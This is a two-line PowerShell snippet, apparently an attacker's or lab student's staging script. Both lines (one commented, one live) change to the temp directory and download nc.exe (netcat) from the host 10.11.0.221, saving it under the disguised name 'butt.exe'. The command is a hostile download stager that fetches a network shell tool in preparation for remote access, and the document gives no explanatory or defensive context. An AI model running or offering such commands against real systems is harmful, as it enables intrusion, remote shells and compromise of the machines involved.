# echo cd $env:temp; $(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.221/nc.exe','butt.exe') >> dl.ps1
cd $env:temp; $(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.221/nc.exe','butt.exe')
